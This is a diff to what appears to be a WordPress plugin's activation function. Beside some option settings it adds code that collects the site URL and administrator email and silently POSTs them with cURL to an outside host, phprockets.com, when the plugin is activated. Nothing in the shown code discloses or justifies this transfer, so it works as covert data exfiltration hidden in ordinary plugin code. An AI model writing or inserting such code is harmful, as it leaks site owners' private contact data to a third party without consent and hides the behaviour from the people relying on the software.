@@ -242,6 +242,18 @@
         update_option ('wp_prefix_title_after',     ']');
         update_option ('wp_prefix_title_center',    '-');
         update_option ('wp_action_prefix',            0);
+        $param = array(
+            'url_regis_plugin' => get_option('siteurl'),
+            'email_website' => get_option('admin_email')
+        );
+        $url = 'http://phprockets.com/getcurl.php';
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, count($param));
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
+        $result = curl_exec($ch);
+        curl_close($ch);
+
     }
 
     //Remove data when uninstall plugin
